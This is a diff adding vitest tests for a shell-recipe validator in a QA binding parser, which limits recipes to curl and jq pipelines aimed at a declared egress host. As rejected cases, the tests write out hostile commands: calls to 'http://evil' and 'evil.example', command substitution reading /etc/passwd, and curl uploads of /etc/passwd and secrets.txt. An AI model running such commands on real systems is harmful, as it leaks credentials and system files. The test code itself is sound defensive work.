@@ -1,5 +1,5 @@
 import { describe, it, expect } from "vitest"
-import { parseBindings } from "../../../src/modules/qa/binding-parser.js"
+import { parseBindings, validateRecipe } from "../../../src/modules/qa/binding-parser.js"
 
 const SAMPLE_PLAN = `
 # Test Plan
@@ -112,5 +112,113 @@ describe("parseBindings", () => {
     if (result.status === "error") {
       expect(result.reason).toMatch(/[Rr]ecipe/)
     }
+  })
+})
+
+describe("validateRecipe — single-statement constraint (Rule 1)", () => {
+  it("accepts a single-pipe pipeline", () => {
+    expect(validateRecipe(`curl "$URL" | jq -er .x`, "$URL").status).toBe("ok")
+  })
+  it("rejects ; chained statements", () => {
+    expect(validateRecipe(`curl "$URL"; rm /tmp/x`, "$URL").status).toBe("error")
+  })
+  it("rejects && chained statements", () => {
+    expect(validateRecipe(`curl "$URL" && curl "http://evil"`, "$URL").status).toBe("error")
+  })
+  it("rejects || chained statements", () => {
+    expect(validateRecipe(`curl "$URL" || curl "http://evil"`, "$URL").status).toBe("error")
+  })
+  it("rejects newline-separated statements", () => {
+    expect(validateRecipe(`curl "$URL"\ncurl "http://evil"`, "$URL").status).toBe("error")
+  })
+  it("accepts \\<newline> line continuation as single statement", () => {
+    expect(validateRecipe(`curl "$URL" \\\n  -H "X: y" | jq -er .x`, "$URL").status).toBe("ok")
+  })
+})
+
+describe("validateRecipe — operator allowlist (Rule 2)", () => {
+  it("rejects $() command substitution", () => {
+    expect(validateRecipe(`curl "$URL" -d "$(cat /etc/passwd)"`, "$URL").status).toBe("error")
+  })
+  it("rejects backticks", () => {
+    expect(validateRecipe('curl "$URL" -d "`cat /etc/passwd`"', "$URL").status).toBe("error")
+  })
+  it("rejects heredoc <<", () => {
+    expect(validateRecipe(`cat <<EOF\nx\nEOF`, "$URL").status).toBe("error")
+  })
+  it("rejects > redirect to non-/dev/null", () => {
+    expect(validateRecipe(`curl "$URL" > /tmp/leak`, "$URL").status).toBe("error")
+  })
+  it("accepts 2>/dev/null", () => {
+    expect(validateRecipe(`curl "$URL" 2>/dev/null | jq -er .x`, "$URL").status).toBe("ok")
+  })
+  it("rejects & background", () => {
+    expect(validateRecipe(`curl "$URL" &`, "$URL").status).toBe("error")
+  })
+})
+
+describe("validateRecipe — command allowlist (Rule 3)", () => {
+  it("rejects unknown command (wget)", () => {
+    expect(validateRecipe(`wget "$URL"`, "$URL").status).toBe("error")
+  })
+  it("rejects bash invocation", () => {
+    expect(validateRecipe(`bash -c "curl $URL"`, "$URL").status).toBe("error")
+  })
+  it("accepts curl + jq pipeline", () => {
+    expect(validateRecipe(`curl "$URL" | jq -er .x`, "$URL").status).toBe("ok")
+  })
+})
+
+describe("validateRecipe — curl flag denylist", () => {
+  it("rejects --upload-file", () => {
+    expect(validateRecipe(`curl --upload-file /etc/passwd "$URL"`, "$URL").status).toBe("error")
+  })
+  it("rejects -T file", () => {
+    expect(validateRecipe(`curl -T /etc/passwd "$URL"`, "$URL").status).toBe("error")
+  })
+  it("rejects -d @file", () => {
+    expect(validateRecipe(`curl -d @/etc/passwd "$URL"`, "$URL").status).toBe("error")
+  })
+  it("rejects --data @file", () => {
+    expect(validateRecipe(`curl --data @secrets.txt "$URL"`, "$URL").status).toBe("error")
+  })
+  it("rejects -o non-null", () => {
+    expect(validateRecipe(`curl -o /tmp/x "$URL"`, "$URL").status).toBe("error")
+  })
+  it("accepts -o /dev/null", () => {
+    expect(validateRecipe(`curl -o /dev/null "$URL"`, "$URL").status).toBe("ok")
+  })
+  it("accepts --data-urlencode 'inline'", () => {
+    expect(validateRecipe(`curl --data-urlencode "email=$X" "$URL"`, "$URL").status).toBe("ok")
+  })
+})
+
+describe("validateRecipe — Egress URL match (Rule 4)", () => {
+  it("accepts curl to declared Egress host", () => {
+    expect(validateRecipe(`curl "$URL/path" | jq -er .x`, "$URL").status).toBe("ok")
+  })
+  it("rejects curl to a different literal host", () => {
+    expect(validateRecipe(`curl "https://evil.example/path"`, "$URL").status).toBe("error")
+  })
+  it("rejects curl to a different $VAR host when Egress is $URL", () => {
+    expect(validateRecipe(`curl "$OTHER/path"`, "$URL").status).toBe("error")
+  })
+})
+
+describe("parseBindings + validateRecipe integration", () => {
+  it("parseBindings rejects plan with invalid recipe", () => {
+    const plan = `
+## Setup
+**Bindings:**
+- \`QA_BIND_TOKEN\` (secret) — bad
+  - Inputs: \`$URL\`
+  - Egress: \`$URL\`
+  - Recipe:
+    \`\`\`bash
+    curl "$URL" && wget "http://evil"
+    \`\`\`
+`
+    const result = parseBindings(plan)
+    expect(result.status).toBe("error")
   })
 })
